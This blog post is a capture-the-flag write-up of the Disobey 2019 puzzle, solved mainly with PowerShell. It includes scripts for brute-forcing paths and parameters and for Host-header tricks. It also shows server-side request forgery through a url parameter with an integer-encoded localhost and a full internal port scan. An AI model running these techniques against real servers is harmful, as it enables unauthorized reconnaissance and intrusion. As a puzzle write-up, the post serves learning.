---
layout: post
title: Solving Disobey 2019 puzzle with PowerShell!
author: Rinorragi
excerpt: I was able to claim my hacker badge for Disobey 2019 mainly using PowerShell.
tags:
- disobey
- hacking
- infosec
- software security
- devsecops
- PowerShell
---

## Disobey 

[Disobey](https://disobey.fi/) is a Nordic security event. It is all about gathering people from different organizations around security topics. The atmosphere in Disobey is hacker friendly. Many are interested in the techniques to attack systems. Most of the participants are white hat hackers who try to find vulnerabilities that could be then patched or limited with other measures. We have been at Disobey in [2017](https://dev.solita.fi/2017/01/19/Disobey.html) and [2018](https://dev.solita.fi/2018/01/26/Disobey.html).

## Puzzle

As the event is hacker friendly, it's possible to get a small discount by hacking. Each year there has been a puzzle that you could solve by hacking. This year's [puzzle](http://puzzle.disobey.fi/) was frustrating, fun and taught me a bunch about hacking. My coworker was able to solve it by creating some utility software with python: [https://teamrot.fi/2018/09/17/solving-the-disobey-2018-puzzle/](https://teamrot.fi/2018/09/17/solving-the-disobey-2018-puzzle/). I instead took a painful route by trying the same thing with PowerShell. It is not that PowerShell would not be good but I was kind of alone with the whole "hacking with PowerShell" mentality. Without the encouragement from [Team Rot](https://teamrot.fi) members I would not have finished it. 

This blog post is about sharing my experiences on "hacking with PowerShell". Spoiler alert.

## Starting with quick recon

Running nmap with quick scan reveals that there are few ports open in the server:
* 80/tcp
* 443/tcp
* 8021/tcp 

After spending many hours with the 8021 port I gave up and went back to the original web page. 

## Dirbusting 

Using common folder name list from [https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt) we start trying to find interesting addresses. I recall that I used OWASP ZAP for this and found .bash_history that lead to a secret url [http://puzzle.disobey.fi/sicret_admin_address/](http://puzzle.disobey.fi/sicret_admin_address/). There is a juicy looking file called mysql_backup.db which after a few hours turned out to be a dead end.

## Page source and lorem.html

Back to the front page of the puzzle. Viewing source for puzzle.disobey.fi shows that there is a somewhat hidden link in the page for the /lorem.html. When the lorem.html is opened, there is just a page full of lorem ipsum. 

Storing the lorem ipsum into original_lorem.txt we can use the content for dirbusting. Most of the time, the response seems to be 404, so I ended up writing a script that tries to find non-404 answers.

```PowerShell
[cmdletbinding()]
Param()
	
$loremWordList = get-content .\original_lorem.txt | % { $_ -replace '[,.]','' } | % { $_ -split ' ' } | unique
$res = ""
$virhe = ""

foreach($loremWord in $loremWordList)
{
	try { 
		$res = Invoke-WebRequest ("http://puzzle.disobey.fi/"+$loremWord) -UseBasicParsing
	}
	catch { 
		$virhe = $_.ErrorDetails
		$res = $_.Exception.Response 
	}

	$res | % { if([int]$_.StatusCode -ne 404){ "Word: "+ $loremWord + " | Status: " + [int]$_.StatusCode +" | Length: " +$_.RawContentLength } }
}
```

Stupid thing in dirbusting with PowerShell is that invoke-webrequest throws exception if there is 4xx or 5xx response. Which makes handling the actual call really ugly. Finally we can find out that /Interdum returns 401 with "wrong vhost" error.

## Interdum with love

The 401 error we got means that we were unauthorized and the error wrong vhost hints that we might want to try to change host header. Trying it out is simple.

```PowerShell
invoke-webrequest http://puzzle.disobey.fi/Interdum -UseBasicParsing -Headers @{Host="lol"}
```

We got a new error: "Try harder - admin". This one was actually a hint. We just needed to use admin as a host header. 

```PowerShell
invoke-webrequest http://puzzle.disobey.fi/Interdum -UseBasicParsing -Headers @{Host="admin"}
```

Yey, we got a new error: Return Greetings! Love you <3 - I need -love also. Yet again this was actually a hint. The thing we needed to do was to append the -love to the url. 

```PowerShell
invoke-webrequest http://puzzle.disobey.fi/Interdum-love -UseBasicParsing -Headers @{Host="admin"}
```

Yey, we got a new error (which I heard is unintended): "The remote name could not be resolved: 'admin'". This is not from the puzzle but from the beneath. Adding admin to the hosts file.

```
185.86.149.26 admin
```

After this we could actually move onwards. 

## Testing the test.php

We got a file listing of the folder. There were secret.txt and test.php files. Of course secret.txt sounds interesting so we look into that first.

```
Hi John!

Here is that secret email - encrypted with your favorite PIN-code!


SnVzdCBraWRkaW5nIC0gYmFzZTY0IGlzIGF3ZXNvbWUu
```

The encryption looks a lot like Base64 so we will give it a shot first. 

```PowerShell
[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("SnVzdCBraWRkaW5nIC0gYmFzZTY0IGlzIGF3ZXNvbWUu"))
```

The neat thing about PowerShell is that it is built on top of .NET. So all the .NET classes are there to be used. We had luck. It was Base64 but it sounds like a teaser: "Just kidding - base64 is awesome.". So we move onwards towards the test.php. 

Accessing test.php gives us 403 unauthorized. So we have actually bypassed authentication already but something is still not working. The first step would be to understand how can we use the php with http requests. We go again to the SecLists and look for common parameter names like [https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt). Then we create a PowerShell script ps_admin_test_params_verbose.ps1 that we can use for trying it out. 

```PowerShell
[cmdletbinding()]
Param(
	[string]$p,
	[string]$p2 = "true")
$res = ""
$virhe = ""

$Headers = @{
	Host = "admin"
}

try { 
	$res = Invoke-WebRequest ("http://admin/Interdum-love/test.php?"+$p+"="+$p2) -UseBasicParsing -Headers $Headers
}
catch { 
	$virhe = $_.ErrorDetails
	$res = $_.Exception.Response 
}

$res | % { ("Status: " + [int]$_.StatusCode +" | Length: " +$_.ContentLength) + " | Parameter: "+ $p + ", " + $p2 + " | ErrorDetails: "+$virhe } 
```

Once we created the help function we simply take all the parameter names and call the function with all of them trying to figure out if we can change something. 

```PowerShell
get-content .\burp-parameter-names.txt | % { .\ps_admin_test_params_verbose.ps1 $_ "1" }
```

We got lucky and we can notice that calling /Interdum-love/test.php?url=1 really returns 200 without any content. So now we know the parameter that we should use. The problem is we do not understand what it is. Name "url" is a hint but it won't reveal itself too soon. After changing the parameter back and forth we can notice that it accepts numbers and number:number notations. Maybe they are IP addresses and ports? As I could not give 127.0.0.1 and I did not know that I can use 0 as an IP address I googled a bit and found a way to translate ip addresses to int. I created script called ps_ipmask_to_int.ps1.

```PowerShell
[cmdletbinding()]
Param(
	[string]$p1,
	[string]$p2,
	[string]$p3,
	[string]$p4)


	[string]$sip = ($p1+"."+$p2+"."+$p3+"."+$p4)
	[IPAddress]$ip = $sip
	$bytes = $ip.GetAddressBytes()
	
	if ([BitConverter]::IsLittleEndian) {
		[Array]::Reverse($bytes)
	}
	
	[BitConverter]::ToUInt32($bytes, 0)
```

By running the script with parameters 127 0 0 1 I get 2130706433 for the localhost and by changing the port to the 80 I can make an attempt. 

```PowerShell
invoke-webrequest http://admin/Interdum-love/test.php?url=2130706433:80 -UseBasicParsing
```

After that I get the puzzle frontpage as a response. After that I tried to continue with the 8021 port that I found earlier with no luck. Back to brute forcing it is. What would be the correct port as I haven't found any other IP addresses? PowerShell to the rescue. First we need a script that we use to make the actual call. We take the ps_admin_test_params_verbose and make non-verbose version of it that recognizes if the content length changes.

```PowerShell
[cmdletbinding()]
Param(
	[string]$p,
	[string]$p2 = "true")
$res = ""
$virhe = ""

$Headers = @{
	Host = "admin"
}

try { 
	$res = Invoke-WebRequest ("http://admin/Interdum-love/test.php?"+$p+"="+$p2) -UseBasicParsing -Headers $Headers
}
catch { 
	$virhe = $_.ErrorDetails
	$res = $_.Exception.Response 
}

$len = $res.RawContentLength 
if($res.ContentLength -gt $len) {
	$len = $res.ContentLength
}

$res | % { if($len -gt 0) { ("Status: " + [int]$_.StatusCode +" | Length: " +$len) + " | Parameter: "+ $p + ", " + $p2 + " | ErrorDetails: "+$virhe } }
```

Then we brute force the tcp ports with oneliner. 

```PowerShell 
1..65535 | % { .\ps_admin_test_params.ps1 "url" ("2130706433:"+$_) }
```

After a while we found new port that we had not found before: 40053. Which returns a long string which again looks like Base64. 

## Reversing the bootloader

I had absolutely no luck figuring out what this is with Windows so I went to the Linux and used `file` command to recognize it as a gzip compressed data. I had tried to just unzip it and other things but it just did not work with 7zip. Finally I was able to get binary out in a working format with tar. I guess it was just the tar that beated me with Windows. 

Nevertheless now I had binary that I recognized to be some kind of bootloader. As I had absolutely no experience on reverse engineering this kind of things I asked community a bit help about tooling. I tried both IDa and radare2 but finally solved the puzzle with radare2. My approach in the end (after spending so many hours) was really simple. 

Start bootloader with qemu

```
.\qemu-system-i386.exe -s .\bootloader
```

Attach radare2 as a debugger

```
.\radare2.exe -D gdb -d gdb://localhost:1234
```

Press all the buttons in the keyboard. Preferably vvv and qq. Suddenly some magic happens with radare2 and look you look something like this. 

```
|....[!] PANIC .Route OS...Disk read failed!...Proxy server to us
|e for fetching files (optional): .Connection to mirror failed vi
|a proxy: .Halting....Overflow (Checksum mismatch) ...GJXHcLO]MhQTbRm\Up_lsi_Zc^n....asd.............ACBD.127.0.0.1:8021?=GIVE_GIVE_GIVE_ME_MY_TICKET............................................
```

## The final step

We finally found something that uses the 8021 port. We are close but nothing really works out of the box. Thinking a bit we found a correct question. What is the url parameter for the GIVE_GIVE_GIVE_ME_MY_TICKET. Yet again we go with the PowerShell and enumerate things a bit. 

```PowerShell
[cmdletbinding()]
Param(
	[string]$p,
	[string]$pMethod)
$res = ""
$virhe = ""

$Headers = @{
	Host = "admin"
}

try { 
	$res = Invoke-WebRequest ("http://puzzle.disobey.fi:8021?"+$p+"=GIVE_GIVE_GIVE_ME_MY_TICKET") -UseBasicParsing -Method $pMethod -Headers $Headers
}
catch { 
	$virhe = $_.ErrorDetails
	$res = $_.Exception.Response 
}

$res | % { if($_.RawContentLength -gt 0) { ("Status: " + [int]$_.StatusCode +" | Length: " +$_.RawContentLength) + " | Parameter: "+ $p + " | ErrorDetails: "+$virhe } }
```

By passing the previously used burp-parameter-names list for the script we can find out that the missing parameter name.  

```PowerShell
get-content .\burp-parameter-names.txt | % { .\ps_8021_give_ticket_params.ps1 $_ "GET" }
```

The missing parameter name was data. And by just accessing the http://puzzle.disobey.fi:8021/?data=GIVE_GIVE_GIVE_ME_MY_TICKET we finally get everything solved.

Hooray! We got a "HACKER!" response with a link to the holvi shop to get our hacker ticket.

## Lessons learned

This was actually my first CTF. This was also maybe the most frustrating challenge I have had in years. I learned a lot. Mostly humbleness. I would guess that it took something like 20 hours in total to solve all the pieces. Although a lot of time were spent on waiting for different kind of brute forcing to stop. I was also happy that I was able to do so much with PowerShell although my hacker friends laughed at me and told me to use real tools... 

It was a fun ride and I will look forward toward next years challenge. 


